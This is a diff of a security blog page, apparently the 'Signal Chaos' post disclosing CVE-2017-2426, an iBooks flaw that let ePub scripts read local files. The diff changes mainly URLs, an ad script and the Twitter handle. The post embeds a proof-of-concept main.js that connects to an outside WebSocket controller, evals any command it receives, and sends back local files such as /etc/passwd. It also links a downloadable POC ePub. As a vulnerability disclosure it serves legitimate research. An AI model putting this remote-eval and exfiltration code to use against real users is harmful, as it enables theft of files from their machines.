@@ -10,8 +10,16 @@
   <meta name="description" content="  “Yes, books are dangerous. They should be dangerous - they contain ideas.” - Pete Hautman">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://s1gnalcha0s.github.io/ibooks/epub/2017/03/27/This-book-reads-you-using-JavaScript.html">
-  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://s1gnalcha0s.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/ibooks/epub/2017/03/27/This-book-reads-you-using-JavaScript.html">
+  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://localhost:4000/feed.xml" />
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({
+      google_ad_client: "ca-pub-2306194403955793",
+      enable_page_level_ads: true
+    });
+  </script>
 </head>
 
 
@@ -70,7 +78,7 @@
   <p>“Yes, books are dangerous. They should be dangerous - they contain ideas.” - Pete Hautman</p>
 </blockquote>
 
-<p>On a previous post about ePub parsers (<a href="/epub/2017/01/25/This-book-reads-you.html">This book reads you - exploiting services and readers that support the ePub book format</a>), I mentioned using scripting capabilities in ePub to perform local attacks against users. </p>
+<p>On a previous post about ePub parsers (<a href="/epub/2017/01/25/This-book-reads-you.html">This book reads you - exploiting services and readers that support the ePub book format</a>), I mentioned using scripting capabilities in ePub to perform local attacks against users.</p>
 
 <p>Apple just released a fix for one issue I reported last year in iBooks that allowed access to files on a users system when a book was opened. iBooks on El Capitan would open an ePub using the file:// origin, which would allow an attacker to access the users file system when they opened a book. (<a href="https://support.apple.com/en-us/HT207615">CVE-2017-2426</a>)</p>
 
@@ -89,7 +97,7 @@
 
 <p><iframe src="https://player.vimeo.com/video/210000247" width="640" height="360" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p>
 
-<p>This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions. </p>
+<p>This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions.</p>
 
 <p><a href="/assets/controller/POC.epub"><img src="/assets/ibooks/ibooksico.png" alt="Image" /></a></p>
 
@@ -106,37 +114,37 @@
   </li>
 </ul>
 
-<p>eg., contents of poc.epub/EPUB/js/main.js </p>
+<p>eg., contents of poc.epub/EPUB/js/main.js</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">WebSocketController</span> <span class="o">=</span> <span class="s1">&#39;ws://websocket-controller.herokuapp.com:80&#39;</span><span class="p">;</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">WebSocketController</span> <span class="o">=</span> <span class="s1">'ws://websocket-controller.herokuapp.com:80'</span><span class="p">;</span>
 
-<span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">WebSocketController</span><span class="p">,</span> <span class="s1">&#39;echo-protocol&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">WebSocketController</span><span class="p">,</span> <span class="s1">'echo-protocol'</span><span class="p">);</span>
 <span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onopen</span><span class="p">()</span> <span class="p">};</span>
 <span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onmessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">};</span>
 <span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onerror</span><span class="p">()</span> <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">onopen</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="nx">message</span><span class="p">(</span><span class="s1">&#39;Connected to WebSocket Controller: &#39;</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
+  <span class="nx">message</span><span class="p">(</span><span class="s1">'Connected to WebSocket Controller: '</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">onerror</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="nx">message</span><span class="p">(</span><span class="s1">&#39;Unable to connect to WebSocket Controller: &#39;</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
+  <span class="nx">message</span><span class="p">(</span><span class="s1">'Unable to connect to WebSocket Controller: '</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">onmessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="c1">//just eval anything sent from the controller</span>
-  <span class="nx">response</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+  <span class="nx">response</span> <span class="o">=</span> <span class="kr">eval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
 
   <span class="c1">//send response back to controller</span>
   <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="kd">function</span> <span class="nx">get</span><span class="p">(</span><span class="nx">loc</span><span class="p">)</span> <span class="p">{</span>
+<span class="kd">function</span> <span class="kd">get</span><span class="p">(</span><span class="nx">loc</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;file://&#39;</span> <span class="o">+</span> <span class="nx">loc</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'file://'</span> <span class="o">+</span> <span class="nx">loc</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
   <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
   
   <span class="c1">//populate the message element</span>
@@ -146,13 +154,13 @@
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">message</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;message&quot;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"message"</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span>
   <span class="k">return</span> <span class="nx">message</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">showExfil</span><span class="p">()</span> <span class="p">{</span>
-  <span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
-<span class="p">}</span></code></pre></div>
+  <span class="kd">get</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
 
 <ul>
   <li><strong>zip -r poc.epub *</strong></li>
@@ -176,11 +184,11 @@
 <p>Shoutouts:</p>
 
 <p><a href="https://twitter.com/shhnjk">@shhnjk</a> reported CVE-2017-2426 as well around the same time 👍. 
-<br /><a href="https://twitter.com/mccabe615">@mccabe615</a> ran a POC to help me confirm some issues independently. </p>
+<br /><a href="https://twitter.com/mccabe615">@mccabe615</a> ran a POC to help me confirm some issues independently.</p>
 
-<p>Thanks for reading. 👋 </p>
+<p>Thanks for reading. 👋</p>
 
-<p><a href="https://twitter.com/craig_arendt">@craig</a></p>
+<p><a href="https://twitter.com/signalchaos">@craig</a></p>
 
   </article>
 
@@ -225,7 +233,7 @@
 
           
           <li>
-            <a href="https://twitter.com/craig_arendt">
+            <a href="https://twitter.com/signalchaos">
               <span class="icon  icon--twitter">
                 <svg viewBox="0 0 16 16">
                   <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809
@@ -233,7 +241,7 @@
                 </svg>
               </span>
 
-              <span class="username">craig_arendt</span>
+              <span class="username">signalchaos</span>
             </a>
           </li>
           
